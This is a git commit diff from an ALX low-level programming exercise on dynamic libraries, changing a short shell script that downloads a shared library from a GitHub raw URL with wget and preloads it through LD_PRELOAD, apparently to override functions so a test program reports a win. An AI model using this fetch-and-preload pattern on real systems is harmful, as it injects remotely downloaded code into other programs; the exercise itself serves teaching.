e6151a281c9761d0c80cc04b01a8f22b48669626
isaacemmanuel37 <isaacochukoemmanuel@gmail.com>
2023-12-12 17:15:20 -0800

    alx

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 wget -p .. https://raw.githubusercontent.com/isaacemmanuel37/alx-low_level_programming/master/0x18-dynamic_libraries/libgiga.so
-export LD_PRELOAD="$PWD/../libhack.so"
+export LD_PRELOAD="$PWD/../libgiga.so"
